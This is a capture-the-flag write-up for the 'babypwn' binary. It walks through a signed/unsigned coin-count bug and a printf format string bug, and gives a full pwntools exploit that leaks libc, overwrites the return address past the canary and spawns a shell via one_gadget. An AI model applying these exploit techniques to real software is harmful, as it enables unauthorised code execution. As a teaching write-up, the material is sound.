# Babypwn

This writeup is based off of: https://devel0pment.de/?p=1191

### Reversing

Let's take a look at the binary:

```
$	pwn checksec babypwn 
[*] '/Hackery/hackIM/bbpwn/babypwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$	file babypwn 
babypwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0962274293f7bca113fc5f453f1e44a83439f5be, not stripped
$	./babypwn 
Create a tressure box?
y
name: %x.%x.%x
How many coins do you have?
2
15
35
Tressure Box: 1.20fcd8d0.10 created!
$	./babypwn 
Create a tressure box?
y
name: %x.%x.%x
How many coins do you have?
2
15
35
Tressure Box: 1.20fcd8d0.10 created!
```

So we can see it is a `64` bit elf, with RELRO, a Stack Canary, and NX. We can also see that there is a format string bug. Let's take a look at the main function in IDA:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@3
  char *box; // rax@4
  char *nameLength; // rax@4
  __int64 v6; // rcx@11
  unsigned __int8 cointCount; // [sp+6h] [bp-6Ah]@1
  unsigned __int8 i; // [sp+7h] [bp-69h]@7
  char *format; // [sp+8h] [bp-68h]@4
  char coins[80]; // [sp+10h] [bp-60h]@8
  char createBox; // [sp+60h] [bp-10h]@1
  __int64 stackCanary; // [sp+68h] [bp-8h]@1

  stackCanary = *MK_FP(__FS__, 40LL);
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  cointCount = 0;
  puts("Create a tressure box?\r");
  _isoc99_scanf("%2s", &createBox);
  if ( createBox == 'y' || createBox == 'Y' )
  {
    printf("name: ");
    box = malloc(0x64uLL);
    format = box;
    *box = 'erusserT';
    *(box + 2) = 'xoB ';
    *(box + 6) = ' :';
    box[14] = 0;
    _isoc99_scanf("%50s", format + 14);
    nameLength = &format[strlen(format)];
    *nameLength = 'detaerc ';
    *(nameLength + 2) = '\n\r!';
    puts("How many coins do you have?\r");
    _isoc99_scanf("%hhu", &cointCount);
    if ( cointCount > 20 )
    {
      perror("Coins that many are not supported :/\r\n");
      exit(1);
    }
    for ( i = 0; i < cointCount; ++i )
      _isoc99_scanf("%d", &coins[4 * i]);
    printf(format);
    free(format);
    result = 0;
  }
  else
  {
    puts("Bye!\r");
    result = 0;
  }
  v6 = *MK_FP(__FS__, 40LL) ^ stackCanary;
  return result;
}
```

So we can see a couple of things. First the majority of this program will only execute if we respond to the `Create a tressure box?` prompt with a `y` or `Y` (otherwise it just prints `Bye` and exits). Proceeding that check, it allocates a `0x64` byte chunk of memory, which it appends the string `Tressure Box: ` to the front, followed by allowing us to scan in `50` bytes of data, then finally appending the string ` created!` to the end.

After that it allows us to scan an unsigned integer into `coinCount`, which is then compared to see if it is less than 20, and if not the program exits. However there is an issue with this. The value being scanned in is an unsigned char:

```
    _isoc99_scanf("%hhu", &coinCount);
```

However when we look at the assembly code for the less than 20, we see that it uses a `jle` instruction to evalutate the comparison, which expects signed integers:

```
.text:000000000040093E                 call    __isoc99_scanf
.text:0000000000400943                 movzx   eax, [rbp+coinCount]
.text:0000000000400947                 cmp     al, 14h
.text:0000000000400949                 jle     short loc_40095F
``` 

This is a bug, since it is scanning in one data value (unsigned char), and then comparing that data value as if it was something different. So what we could do is scan in the value `-1`, which would get stored as `0xff`, and then when it does the comparison, it will see it as being less than `20` and will not trigger the program to exit. Then later on when the value `coinCount` is being used to see how long a for loop will run, so we can get it to run longer since the comparison then is made with `jb` which is an unsigned comparison:

```
.text:0000000000400993                 movzx   eax, [rbp+coinCount]
.text:0000000000400997                 cmp     [rbp+var_69], al
.text:000000000040099A                 jb      short loc_400965
```

Now we can see that the loop is interesting since it will allow us to scan in four bytes of data into `coins`, starting at `rbp-0x60`, moving up `0x4` bytes for each iteration. Normally we would only be able to move up `80` (`0x50`) bytes due to the `20` restriction, however with the signed/unsigned bug earlier we can extend that much further to the stack canary and even the return address (since `0xff * 4` will place us well beyond the return address). Lastly we can see that there is a format string bug with our input which was scanned into the heap:

```
    printf(format);
```

Here we can see that there is a format string bug, since it is printing user defined data without a format string.

### Overwrite Return Address

Our first step will be to overwrite the return address, which we will do using the signed/unsigned bug coupled with the scanf loop. Now we can see that the start of our input in `coins` will be at `rbp-0x60`:

```
  char coins[80]; // [sp+10h] [bp-60h]@8
```

Since with our architecture the return address is stored at `rbp+0x8`, that leaves us with `0x68` bytes of space in between the start of our input and the return address. Since we write data four bytes at a time, that leaves us with `104 / 4 = 26` writes before we get to the return address. Now there is one issue with this, and that there is the stack canary in our way, which unless if we do something about we will overwrite it and the program will terminate before we get code execution. However when scanf is called with the "%d" flag, you can just input either a `+` or a `-` (which it uses to signify the sign of the value) and it won't actually write over the value. With this we can use the bug to write over the return address and nothing else.

Now for the value we will overwrite, we will go with the address of the main function `0x400806` (no PIE so it is a static address). The reason for this being, is directly proceeding this we will use the format string bug to get a libc infoleak. However since it is after our write we can't use the infoleak in this write, so we will just call the main function again to exploit the bugs again with the libc infoleak.

### libc infoleak

So the next step is to get the libc infoleak. First we will find where our input is on the stack, in relation to the printf call.

```
gdb-peda$ r
Starting program: /Hackery/hackIM/bbpwn/babypwn 
Create a tressure box?
y
name: %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx
How many coins do you have?
1
57005
Tressure Box: 1.7ffff7dd18d0.10.0.0.101000000000000.602260.dead.7ffff7dd7660.7fffffffdfa8 created!
```

So we can see that we can print our input `57005` (which in hex is `0xdead`) at an offset of `8`. So we can store the got address for `puts` as the first coin, and then have the format string be `%8$s` and we will print the libc address for puts (since `%s` signifies a char array pointer):

```
gdb-peda$ r
Starting program: /Hackery/hackIM/bbpwn/babypwn 
Create a tressure box?
y
name: %8$s
How many coins do you have?
1
6295472
Tressure Box: �I��� created!
```

Here we can see that we were able to get an infoleak (and when we use a script to read the infoleak, and check it with gdb, we see that it is the address of `puts`). So with this we can get a libc infoleak. For the next part we will be using a oneshot gadget, however for that we will need to find the libc version. Luckily we can do that against the server, by leaking the address of both puts and malloc in a single run. To do that you can input the got address for `malloc` after the address of puts (make sure you write `0x0` in between the two got addresses, since you are writing 4 bytes of data to eight byte pointers). After that just add a `%9$s` to the format string, and in addition to the `puts` infoleak, we will get the `malloc` infoleak. After that you can take those addresses you get to the website `https://libc.blukat.me/`, plug in the values for `_IO_puts` and `__libc_malloc`, it will tell us that the libc file is `libc6_2.23-0ubuntu10_amd64` (also since when I worked on this the challenge was no longer being hosted, this is coming directly from the writeup this is based off of). From there we can download the libc file and look for the oneshot gadget.

### OneGadget

OneGagdet is a project (you can find it here: https://github.com/david942j/one_gadget) that if we give it a libc file, it will return to us a ROP gadget that will give us a call to `execve('/bin/sh', NULL, NULL)` given certain conditions. We can check what gadgets it finds for us:

```
$	one_gadget libc6_2.23-0ubuntu10_amd64.so 
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Each of these gadgets have their own condition which is needed for the `execve` call to work. I just tried the first one and it worked (if it didn't, I would go down the list), instead of checking to see what conditions were met at the time. With all of these things we can write the exploit:

### Exploit

Here is the exploit. Also with using the LD_PRELOAD I had issues doing it on Ubunutu 18.04, so I just switched to Ubuntu 16.04:

```
# This exploit is based off of: https://devel0pment.de/?p=1191

from pwn import *

# Estbalish the target, the enviornment, and the libc file
target = process('./babypwn', env = {'LD_PRELOAD':'./libc'})
elf = ELF('libc')
gdb.attach(target, gdbscript='b *0x40084e')

# This is just a function to hande the IO for the start
def start(name, coins):
    print target.recvline()
    target.sendline('y')
    print target.recvuntil("name:")
    target.sendline(name)
    print target.recvuntil("How many coins do you have?")
    target.sendline(str(coins))

# setup the format string infoleak and signed/unsigned bug
start("%8$s", -1)

# 6295472 = 0x600fb0 = got address of puts for puts infoleak
# 0 since top 4 bytes of got address are 0 
target.sendline("6295472")
target.sendline("0")

# Fill the space untill the return address
for i in xrange(24):
    target.sendline('+')

# Set the return address to start, to restart the code
target.sendline("4196112")
target.sendline("0")

# Go through the rest of the scanf calls without writing over anything
for i in xrange(227):
    target.sendline('+')

# Can in the infoleak
target.recvline()
leak = target.recvline()

# Filter it out, calculate the libc base and address of oneshot gadget

leak = leak.replace("Tressure Box: ", "")
leak = leak.replace(" created!", "")
leak = leak.replace("\x0d\x0a", "")

leak = u64(leak + "\x00"*(8 - len(leak)))
libc = leak - elf.symbols['puts']
onegadget = libc + 0x45216

print "puts address  is: " + hex(leak)
print "the libc base is: " + hex(libc)
print "one gadget is:    " + hex(onegadget)

# Go through the initial portion of the program again, don't trigger format string bug
start("15935728", "-1")

# Go through the scanf bugs untill we reach the return address
for i in xrange(26):
    target.sendline('+')

# Overwrite the return address with the oneshot gadget
target.sendline(str((onegadget & 0xffffffff)))
target.sendline(str((onegadget >> 32 )))

# Go through the rest of the scanf calls
for i in xrange(227):
    target.sendline('+')

# Drop to an interactive shell
target.interactive()
```

and when we run it:
```
$ python exploit.py 
[+] Starting local process './babypwn': pid 96199
[*] '/home/guyinatuxedo/Desktop/libc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] running in new terminal: /usr/bin/gdb -q  "./babypwn" 96199 -x "/tmp/pwnthrpx4.gdb"
[+] Waiting for debugger: Done
Create a tressure box?

name:
 How many coins do you have?
puts address  is: 0x7f0f01195690
the libc base is: 0x7f0f01126000
one gadget is:    0x7f0f0116b216
Create a tressure box?

name:
 How many coins do you have?
[*] Switching to interactive mode

Tressure Box: 15935728 created!
$ ls
babypwn  core  exploit.py  leak.py  libc  peda-session-babypwn.txt
$ w
 14:20:39 up  1:19,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu tty7     :0               13:02    1:18m 22.59s  0.16s /sbin/upstart --user
$ 
[*] Interrupted
[*] Stopped process './babypwn' (pid 96199)
```

Just like that, we popped a shell!
